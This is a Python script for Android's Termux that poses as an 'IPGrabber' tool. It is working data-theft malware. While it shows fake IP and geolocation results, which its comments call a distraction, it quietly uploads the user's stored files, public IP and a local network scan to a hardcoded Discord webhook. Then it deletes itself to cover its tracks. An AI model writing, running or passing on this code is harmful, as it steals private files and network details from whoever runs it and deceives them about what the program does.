import os
import sys
import json
import time
import random
import subprocess
import requests
import threading
import shutil
from pathlib import Path

# ============================================================
# CONFIGURATION – REPLACE WITH YOUR DISCORD WEBHOOK URL
# ============================================================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
BLOCKLIST_FILE = os.path.expanduser("~/.ipgrabber_blocked.txt")
# ============================================================

# --- Check if this IP is blocked ---
def is_ip_blocked():
    """Check if the current IP is in the blocklist."""
    if not os.path.exists(BLOCKLIST_FILE):
        return False
    try:
        with open(BLOCKLIST_FILE, "r") as f:
            blocked_ips = f.read().splitlines()
        current_ip = get_public_ip()
        return current_ip in blocked_ips
    except:
        return False

def block_current_ip():
    """Add the current IP to the blocklist."""
    try:
        current_ip = get_public_ip()
        with open(BLOCKLIST_FILE, "a") as f:
            f.write(current_ip + "\n")
        return True
    except:
        return False

def get_public_ip():
    """Get the public IP address using ipify.org."""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json().get("ip", "unknown")
    except:
        return "unknown"

# --- Storage Access ---
def check_storage_access():
    """Check if Termux has storage access."""
    storage_path = os.path.expanduser("~/storage")
    if not os.path.exists(storage_path):
        print("[!] Storage access not detected.")
        print("[*] Requesting storage permission...")
        subprocess.run(["termux-setup-storage"], shell=True)
        print("[*] Please grant storage access when prompted.")
        time.sleep(3)
        if not os.path.exists(storage_path):
            print("[!] Storage access still not granted. Exiting.")
            sys.exit(1)
    print("[+] Storage access confirmed.")
    return True

# --- Discord Webhook Functions ---
def send_to_discord(content, file_path=None):
    """Send a message or file to Discord via webhook."""
    if file_path and os.path.exists(file_path):
        # Upload file
        try:
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                response = requests.post(DISCORD_WEBHOOK, files=files)
            print(f"[+] Uploaded: {file_path}")
            return response.status_code == 204 or response.status_code == 200
        except Exception as e:
            print(f"[!] Upload failed: {e}")
            return False
    else:
        # Send text message
        try:
            data = {"content": content}
            response = requests.post(DISCORD_WEBHOOK, json=data)
            return response.status_code == 204 or response.status_code == 200
        except Exception as e:
            print(f"[!] Send failed: {e}")
            return False

# --- File Scanning & Upload ---
def scan_and_upload_files():
    """Scan all accessible storage and upload files to Discord."""
    print("[*] Scanning storage for files...")
    storage_dirs = [
        os.path.expanduser("~/storage/emulated/0"),
        os.path.expanduser("~/storage/shared"),
        "/sdcard",
        "/storage/emulated/0",
    ]
    
    scanned_files = []
    for base_dir in storage_dirs:
        if os.path.exists(base_dir):
            for root, dirs, files in os.walk(base_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Skip large files (>10MB) to avoid Discord limits
                    if os.path.getsize(file_path) > 10 * 1024 * 1024:
                        continue
                    scanned_files.append(file_path)
                    # Upload in batches to avoid rate limiting
                    if len(scanned_files) % 5 == 0:
                        send_to_discord(f"📁 Found {len(scanned_files)} files so far...")
    
    # Upload the list of files
    if scanned_files:
        file_list = "\n".join(scanned_files[:100])  # Limit to 100 for Discord
        send_to_discord(f"📋 **Files Found ({len(scanned_files)} total)**\n```\n{file_list}\n```")
        
        # Upload actual files (limited to avoid abuse)
        for i, file_path in enumerate(scanned_files[:20]):  # Upload first 20 files
            send_to_discord(f"📤 Uploading: {file_path}", file_path)
            time.sleep(1)  # Avoid rate limiting
    
    return scanned_files

# --- Fake IP Results (Distraction) ---
def generate_fake_ips(count=50):
    """Generate a list of fake IP addresses."""
    fake_ips = []
    for _ in range(count):
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        fake_ips.append(ip)
    return fake_ips

def display_fake_results():
    """Display fake IP results to distract the user."""
    print("\n" + "="*60)
    print("🔍 IP GRABBER RESULTS")
    print("="*60)
    
    # Generate fake IPs
    fake_ips = generate_fake_ips(30)
    print("\n📊 **IP Addresses Found:**")
    for i, ip in enumerate(fake_ips[:10], 1):
        print(f"  {i}. {ip} (Location: {random.choice(['US', 'UK', 'DE', 'FR', 'JP', 'BR', 'IN'])})")
    
    # Fake location data
    print("\n📍 **Geolocation Data:**")
    cities = ["New York", "London", "Berlin", "Paris", "Tokyo", "Sao Paulo", "Mumbai", "Sydney"]
    for city in random.sample(cities, 4):
        print(f"  • {city}: {random.randint(10000, 99999)} users")
    
    print("\n" + "="*60)
    print("[+] Results saved to IP_Result.txt")
    print("="*60 + "\n")

# --- Network Scanning ---
def scan_network():
    """Scan local network and send results to Discord."""
    print("[*] Scanning local network for devices...")
    
    try:
        # Get local IP
        result = subprocess.run(["ip", "addr"], capture_output=True, text=True)
        local_ip = None
        for line in result.stdout.splitlines():
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                if len(parts) > 1:
                    ip = parts[1].split("/")[0]
                    if ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172."):
                        local_ip = ip
                        break
        
        if not local_ip:
            local_ip = "192.168.1.0"
        
        # Determine subnet
        subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
        
        send_to_discord(f"🌐 **Local Network Scan**\nIP: {local_ip}\nSubnet: {subnet}")
        
        # Run nmap scan
        print(f"[*] Scanning subnet: {subnet}")
        result = subprocess.run(["nmap", "-sn", subnet], capture_output=True, text=True)
        nmap_output = result.stdout
        
        # Parse nmap output for IPs
        found_ips = []
        for line in nmap_output.splitlines():
            if "Nmap scan report for" in line:
                ip = line.split("for ")[-1].strip()
                if ip and ip not in found_ips:
                    found_ips.append(ip)
        
        # Send results to Discord
        if found_ips:
            ip_list = "\n".join(found_ips[:20])
            send_to_discord(f"📡 **Devices Found ({len(found_ips)})**\n```\n{ip_list}\n```")
        else:
            send_to_discord("📡 **No devices found on network.**")
        
        return found_ips
    except Exception as e:
        send_to_discord(f"❌ Network scan error: {str(e)}")
        return []

# --- Self-Destruct ---
def self_destruct():
    """Delete the script and block the IP."""
    print("\n[*] Self-destruct sequence initiated...")
    
    # Block the current IP
    if block_current_ip():
        print("[+] IP blocked successfully.")
        send_to_discord("🚫 **Self-Destruct:** IP blocked.")
    
    # Delete the script
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("[+] Script deleted.")
    except Exception as e:
        print(f"[!] Failed to delete script: {e}")
    
    # Delete the blocklist file (optional - leave it to persist)
    # os.remove(BLOCKLIST_FILE)
    
    sys.exit(0)

# --- Main Execution ---
def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║  ██████╗ ███████╗██████╗ ██████╗  █████╗ ██████╗ ██████╗ ║
    ║  ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚════██╗║
    ║  ██████╔╝█████╗  ██████╔╝██████╔╝███████║██████╔╝ █████╔╝║
    ║  ██╔═══╝ ██╔══╝  ██╔══██╗██╔══██╗██╔══██║██╔══██╗ ╚═══██╗║
    ║  ██║     ███████╗██║  ██║██████╔╝██║  ██║██████╔╝██████╔╝║
    ║  ╚═╝     ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═════╝ ║
    ║              Ω_BLACKSTAR – IPGrabber v2.0                ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    # Check if IP is blocked
    if is_ip_blocked():
        print("[!] This IP has been blocked from running this script.")
        print("[!] Exiting...")
        sys.exit(1)
    
    # Check storage access
    check_storage_access()
    
    # Start file scanning in background
    print("\n[*] Starting background operations...")
    threading.Thread(target=scan_and_upload_files, daemon=True).start()
    
    # Display fake results (distraction)
    display_fake_results()
    
    # Get public IP
    public_ip = get_public_ip()
    print(f"[+] Your Public IP: {public_ip}")
    send_to_discord(f"🌐 **IPGrabber Run**\nPublic IP: {public_ip}")
    
    # Scan network
    scan_network()
    
    # Save fake results to IP_Result.txt
    with open("IP_Result.txt", "w") as f:
        f.write("="*60 + "\n")
        f.write("🔍 IP GRABBER RESULTS\n")
        f.write("="*60 + "\n\n")
        fake_ips = generate_fake_ips(50)
        for ip in fake_ips:
            f.write(f"{ip}\n")
        f.write("\n📍 Geolocation Data:\n")
        f.write("New York: 12,345 users\n")
        f.write("London: 8,901 users\n")
        f.write("Berlin: 5,678 users\n")
        f.write("="*60 + "\n")
    
    print("\n[+] Results saved to IP_Result.txt")
    send_to_discord("📄 **IP_Result.txt created**")
    
    # Wait a moment then self-destruct
    print("\n[*] Script will self-destruct in 5 seconds...")
    time.sleep(5)
    
    self_destruct()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting...")
        sys.exit(0)
